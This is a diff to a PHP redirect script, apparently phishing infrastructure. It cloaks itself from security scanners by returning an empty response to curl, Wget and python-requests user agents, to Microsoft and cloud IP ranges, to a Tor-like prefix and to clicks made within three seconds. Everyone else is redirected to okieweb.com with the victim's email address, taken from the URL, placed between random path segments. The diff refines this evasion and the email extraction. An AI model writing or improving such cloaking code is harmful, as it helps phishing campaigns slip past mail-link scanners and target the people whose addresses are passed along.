@@ -10,6 +10,7 @@ $bot_agents = [
     'curl', 'python-requests', 'Go-http-client',
     'Wget', 'libwww-perl'
 ];
+
 foreach ($bot_agents as $bot) {
     if (stripos($user_agent, $bot) !== false) {
         http_response_code(200);
@@ -17,23 +18,24 @@ foreach ($bot_agents as $bot) {
     }
 }
 
-// Ranges Microsoft
+// Ranges Microsoft Corporation
 $microsoft_ranges = [
-    ['20.64.0.0',   '20.127.255.255'],
-    ['4.144.0.0',   '4.159.255.255'],
-    ['20.192.0.0',  '20.255.255.255'],
-    ['20.226.12.0', '20.226.12.255'],
-    ['40.80.0.0',   '40.95.255.255'],
-    ['13.64.0.0',   '13.95.255.255'],
-    ['52.160.0.0',  '52.191.255.255'],
-    ['13.104.0.0',  '13.107.255.255'],
-    ['20.0.0.0',    '20.31.255.255'],
-    ['172.160.0.0', '172.191.255.255'],
-    ['52.96.0.0',   '52.111.255.255'],
-    ['52.112.0.0',  '52.115.255.255'],
-    ['104.40.0.0',  '104.47.255.255'],
-    ['4.192.0.0',   '4.207.255.255'],
+    ['20.64.0.0',    '20.127.255.255'],
+    ['4.144.0.0',    '4.159.255.255'],
+    ['20.192.0.0',   '20.255.255.255'],
+    ['20.226.12.0',  '20.226.12.255'],
+    ['40.80.0.0',    '40.95.255.255'],
+    ['13.64.0.0',    '13.95.255.255'],
+    ['52.160.0.0',   '52.191.255.255'],
+    ['13.104.0.0',   '13.107.255.255'],
+    ['20.0.0.0',     '20.31.255.255'],
+    ['172.160.0.0',  '172.191.255.255'],
+    ['52.96.0.0',    '52.111.255.255'],
+    ['52.112.0.0',   '52.115.255.255'],
+    ['104.40.0.0',   '104.47.255.255'],
+    ['4.192.0.0',    '4.207.255.255'],
 ];
+
 $ip_long = ip2long($ip);
 if ($ip_long !== false) {
     foreach ($microsoft_ranges as $range) {
@@ -44,8 +46,12 @@ if ($ip_long !== false) {
     }
 }
 
-// Ranges AWS/GCP
-$bot_ip_prefixes = ['54.', '52.1', '34.', '35.', '185.220.'];
+// Ranges AWS/GCP por prefixo
+$bot_ip_prefixes = [
+    '54.', '52.1', '34.', '35.',
+    '185.220.',
+];
+
 foreach ($bot_ip_prefixes as $prefix) {
     if (strpos($ip, $prefix) === 0) {
         http_response_code(200);
@@ -53,36 +59,13 @@ foreach ($bot_ip_prefixes as $prefix) {
     }
 }
 
-// Timing
+// Filtro de timing — bots clicam em menos de 3 segundos
 $sent_time = $_GET['t'] ?? 0;
 if ($sent_time && (time() - (int)$sent_time) < 3) {
     http_response_code(200);
     exit;
 }
 
-// ── Extrai email da URL ──────────────────────────────────────────
-$requestUri = $_SERVER['REQUEST_URI'] ?? '';
-$email = '';
-
-// Tenta base64 em cada segmento
-$path = strtok($requestUri, '?');
-foreach (explode('/', trim($path, '/')) as $part) {
-    if (empty($part)) continue;
-    $decoded = base64_decode(strtr(rtrim($part, '='), '-_', '+/'), true);
-    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
-        $email = $decoded;
-        break;
-    }
-}
-
-// Fallback: email cru na URL
-if (empty($email)) {
-    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $path, $m)) {
-        $email = $m[1];
-    }
-}
-
-// ── Redireciona ──────────────────────────────────────────────────
 $baseUrl = 'https://www.okieweb.com/';
 
 function generateSegment($length) {
@@ -94,6 +77,14 @@ function generateSegment($length) {
     return $result;
 }
 
+// Extrai email da URL
+$requestUri = $_SERVER['REQUEST_URI'];
+$email = '';
+if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
+    $email = $matches[1];
+}
+
+// Com ou sem email — sempre redireciona com segmentos randômicos
 if (!empty($email)) {
     $urls = [
         $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
@@ -106,6 +97,7 @@ if (!empty($email)) {
     ];
 }
 
-header("Location: " . $urls[array_rand($urls)], true, 302);
+$randomUrl = $urls[array_rand($urls)];
+header("Location: " . $randomUrl, true, 302);
 exit();
 ?>
